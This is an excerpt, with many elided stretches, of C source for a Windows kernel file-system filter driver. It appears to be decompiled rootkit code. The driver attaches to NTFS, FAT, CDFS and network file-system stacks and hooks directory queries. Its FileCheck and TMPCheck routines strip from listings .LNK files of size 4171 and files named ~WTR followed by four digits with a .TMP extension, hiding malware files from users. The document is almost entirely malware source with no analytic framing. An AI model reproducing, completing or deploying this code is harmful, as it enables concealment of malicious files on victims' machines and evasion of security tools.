...
PCWSTR FileSystemsArray[3] = {
    L"\\FileSystem\\ntfs", L"\\FileSystem\\fastfat", L"\\FileSystem\\cdfs",
};
...
#define FUNC                                                                   \
  ...
  (PUNICODE_STRING ObjectName, ULONG Attributes, PACCESS_STATE AccessState,    \
   ...
   KPROCESSOR_MODE AccessMode, PVOID ParseContext OPTIONAL, PVOID * Object)
...
NTSTATUS CreateDevice(PDEVICE_OBJECT TargetDevice,
...
BOOLEAN AttachToStack(PDEVICE_OBJECT SourceDevice, PDEVICE_OBJECT TargetDevice,
...
NTSTATUS FileControlCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp,
                                      PDEVICE_OBJECT *Context);
BOOLEAN AttachDelayThread(PDEVICE_OBJECT DeviceObject,
...
NTSTATUS DirectoryCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp,
                                    PDEVICE_OBJECT *Context);
VOID FreeMdl(PIRP Irp, PMDL *Context);
ULONG AllocateMdl(PMDL *LclContext, PIRP Irp, PIO_STACK_LOCATION CurrentStack);
ULONG CreateWorkRoutine(PDEVICE_OBJECT DeviceObject,
                        PIO_STACK_LOCATION CurrentStack, PIRP Irp,
                        PVOID LclContext);
NTSTATUS WorkerRoutine(PDEVICE_OBJECT DeviceObject, PLARGE_INTEGER Context);
ULONG GetOffsets(ULONG FileInformationClass, ULONG *EndOfFile,
                 ULONG *FilenameOffset, ULONG *FilenameLength);
ULONG FileCheck(PVOID UserBuffer, ULONG NextEntryOffset, ULONG EndOfFile,
                ULONG FilenameOffset, ULONG FilenameLength);
...
VOID CallDriver(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
  ...
  Irp->Tail.Overlay.CurrentStackLocation =
      ((ULONG)Irp->Tail.Overlay.CurrentStackLocation +
       (ULONG)sizeof(IO_STACK_LOCATION)); // 0x24);
  IoCallDriver(
...
NTSTATUS DriverEntry(IN PDRIVER_OBJECT pDriverObject,
  ...
  status =
      IoCreateDevice(DriverObject, sizeof(_DEVICE_EXTENSION), 0,
  ...
  status = IoRegisterFsRegistrationChange(
      DriverObject, (PDRIVER_FS_NOTIFICATION)DriverNotificationRoutine);
  if (status != STATUS_SUCCESS) {
    IoDeleteDevice(DeviceObject);
...
VOID HookOne(FUNC, PCWSTR FileSystem) {
  ...
  Status = (*ObReferenceObjectByNameFunc)(&DestinationString, 0x40, 0, 0,
  ...
  while (AttachObject != 0) {
    ...
    AttachObject = (PDEVICE_OBJECT) *
                   ((int *)((ULONG)AttachObject + (ULONG)0x0C)); // Next Element
  };
...
VOID DriverNotificationRoutine(PDEVICE_OBJECT TargetDevice, int command) {
  ...
  if (command == COMMAND_ATTACH) {
    ...
    while (AttachedDevice != 0) {
      ...
      AttachedDevice =
          TargetDevice->AttachedDevice; // Get The Next Attached Device
    };
  };
};
/**-------------------------------------------------------------------
...
VOID AttachDevice(PDEVICE_OBJECT TargetDevice) {
  ...
  if (TargetDevice->DeviceType == FILE_DEVICE_DISK_FILE_SYSTEM ||
      ...
      TargetDevice->DeviceType == FILE_DEVICE_NETWORK_FILE_SYSTEM) {
    if (IsAllreadyAttached(TargetDevice) == TRUE)
      return;
    if (CreateDevice(TargetDevice, &SourceDevice) != STATUS_SUCCESS)
      return;
    SettingFlags(SourceDevice, TargetDevice);
    SetZero(SourceDevice->DeviceExtension, 0);
    if (AttachToStack(SourceDevice, TargetDevice,
                      SourceDevice->DeviceExtension) != TRUE) {
...
BOOLEAN IsAllreadyAttached(PDEVICE_OBJECT TargetDevice) {
  ...
  if (TargetDevice != 0) {
    AttachedDevice = TargetDevice->AttachedDevice;
    while (AttachedDevice != 0) {
      if (AttachedDevice->DriverObject == DriverObject &&
          AttachedDevice->DeviceExtension != 0) {
        return TRUE; // Allready Attached
      };
      AttachedDevice =
          AttachedDevice->AttachedDevice; // Get The Next Attached Device
    };
  }
  return FALSE;
}
...
NTSTATUS CreateDevice(PDEVICE_OBJECT TargetDevice,
                      PDEVICE_OBJECT *SourceDevice) {
  return IoCreateDevice(DriverObject, sizeof(_DEVICE_EXTENSION), 0,
                        TargetDevice->DeviceType, 0, 0, SourceDevice);
}
...
VOID SettingFlags(PDEVICE_OBJECT DeviceObject, PDEVICE_OBJECT TargetDevice) {
  DeviceObject->Flags |=
      (TargetDevice->Flags & (0x40000 | 0x10 | DO_BUFFERED_IO));
  DeviceObject->Characteristics |=
      (TargetDevice->Characteristics & FILE_DEVICE_SECURE_OPEN);
};

BOOLEAN AttachToStack(PDEVICE_OBJECT SourceDevice, PDEVICE_OBJECT TargetDevice,
                      PDEVICE_EXTENSION DeviceExtension) {
  DeviceExtension->AttachedDevice = TargetDevice;
  if (IoAttachDeviceToDeviceStack(SourceDevice, TargetDevice) ==
      STATUS_SUCCESS) {
    return TRUE;
  };
  return FALSE;
...
VOID OnFileSystemControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
  if (Irp->Tail.Overlay.CurrentStackLocation->MinorFunction ==
      IRP_MN_MOUNT_VOLUME) {
...
VOID SetCompletionFileControl(PDEVICE_OBJECT TargetDevice, PIRP Irp) {
  ...
  SetZero(DeviceObject->DeviceExtension,
          Irp->Tail.Overlay.CurrentStackLocation->Parameters.MountVolume.Vpb
              ->RealDevice);
...
NTSTATUS SetFSCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
  ...
  *Buff = DeviceObject;
  ...
  PrevStack = ((ULONG)Irp->Tail.Overlay.CurrentStackLocation -
...
NTSTATUS FileControlCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp,
                                      PDEVICE_OBJECT *Context) {
  PDEVICE_OBJECT TargetDevice;
  TargetDevice = ((PDEVICE_EXTENSION)((*Context)->DeviceExtension))
                     ->RealDevice->Vpb->DeviceObject;
...
BOOLEAN AttachDelayThread(PDEVICE_OBJECT DeviceObject,
  ...
  for (i = 0; i < 8; i++) {
    if (AttachToStack(DeviceObject, TargetDevice,
                      DeviceObject->DeviceExtension) == TRUE) {
      return TRUE;
    };
...
VOID SetCompletionDirControl(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
  ...
  int i;
  CurrentStack = Irp->Tail.Overlay.CurrentStackLocation;
  if (!(CurrentStack->FileObject->Flags & 0x400000) &&
      CurrentStack->FileObject != 0) {
    Irp->Tail.Overlay.CurrentStackLocation->Parameters.QueryDirectory.FileName =
        0; // Clear Filename
    if (CurrentStack->FileObject != 0)
      CurrentStack->FileObject->Flags &= 0x400000;
    CallDriver(DeviceObject, Irp);
  }
  Filename = CurrentStack->Parameters.QueryDirectory.FileName;
  if (Filename != 0 &&
      Filename->Length == 0x4C /*The Size of BannedDirectory*/) {
    for (i = 0; i < 19; i++) {
  ...
  Error:
    ...
    if (Irp->Tail.Overlay.CurrentStackLocation->FileObject != 0)
      Irp->Tail.Overlay.CurrentStackLocation->FileObject->Flags &= 0x400000;
    CallDriver(DeviceObject, Irp);
    return;
  };
...
NTSTATUS DirectoryCompletionRoutine(PDEVICE_OBJECT DeviceObject, PIRP Irp,
  ...
  if (GetOffsets(Irp->Tail.Overlay.CurrentStackLocation->Parameters
  ...
  if (Irp->MdlAddress != 0) {
    if (Irp->MdlAddress->MdlFlags == 5) {
      // maps the physical pages that are described by The MDL to a virtual
      // address
      mmFiles = MmMapLockedPagesSpecifyCache(Irp->MdlAddress, 0, MmCached, 0, 0,
                                             0x10);
      if (mmFiles == 0) {
        FreeMdl(Irp, LclContext);
        return 0;
  ...
  if (FileCheck(mmFiles, Irp->Tail.Overlay.CurrentStackLocation->Parameters
  ...
  if (Irp->MdlAddress == 0) {
    ...
    if (LclContext == 0 ||
        AllocateMdl(LclContext, Irp, Irp->Tail.Overlay.CurrentStackLocation) ==
            0) {
      FreeMdl(Irp, LclContext);
  ...
  Irp->IoStatus.Status = CreateWorkRoutine(
      DeviceObject, Irp->Tail.Overlay.CurrentStackLocation, Irp, LclContext);
  return;
};
...
ULONG AllocateMdl(PMDL *LclContext, PIRP Irp, PIO_STACK_LOCATION CurrentStack) {
  ...
  pMdl =
      IoAllocateMdl(Irp->UserBuffer,
                    CurrentStack->Parameters.QueryDirectory.Length, 0, 0, Irp);
  if (pMdl == 0) {
    return 0;
  };
...
ULONG FileCheck(ULONG *UserBuffer, ULONG NextEntryOffset, ULONG EndOfFile,
                ULONG FilenameOffset, ULONG FilenameLength) {
  ...
  do {
    ...
    if (Length & 1) { // mean couldn't be divided by 2 (That's will be strange
                      // because it's a unicode string (Wide char))
      EntryPtr = UserBuffer;
    ...
    if ((((FileSize.u.HighPart != -1) && (FileSize.u.LowPart != -1)) ||
         (FileSize.u.HighPart == 0 && FileSize.u.LowPart == 4171)) &&
        (Length > 4)) {
      if (StrCheck(L".LNK", &Filename[Length - 4], 4) != 0) {
        memmove(UserBuffer, UserBuffer + NextEntryOffset,
                PrevOffset - NextEntryOffset);
        PrevOffset -= NextEntryOffset;
        continue;
      };
    };
    if (TMPCheck(Filename, Length, FileSize.u.LowPart, FileSize.u.HighPart) ==
        0) {
      EntryPtr = UserBuffer;
      UserBuffer += NextEntryOffset;
      (ULONG) UserBuffer |= 0x01; // mov     byte ptr [ebp+UserBuffer+3], 1
  ...
  return ((ULONG)UserBuffer &
          1); // cmp     byte ptr [ebp+UserBuffer+3], 0  / setnz   al
};
...
ULONG TMPCheck(PCWSTR Filename, int Length, int LowPart, int HighPart) {
  ...
  WCHAR chr;
  int Mod = 0;
  if (!(LowPart == -1 && HighPart == -1) &&
      (HighPart == 0 || LowPart < 4096 || LowPart > 8388608))
    return 0;
  if (Length != 12)
    return 0;
  if (StrCheck(L".TMP", &Filename[Length - 4], 4) == 0)
    return 0;
  if (StrCheck(L"~WTR", Filename, 4) == 0)
    return 0;
  for (i = 4; i < 8; i++) {
    chr = Filename[i];
    if (chr < '0' || chr > '9')
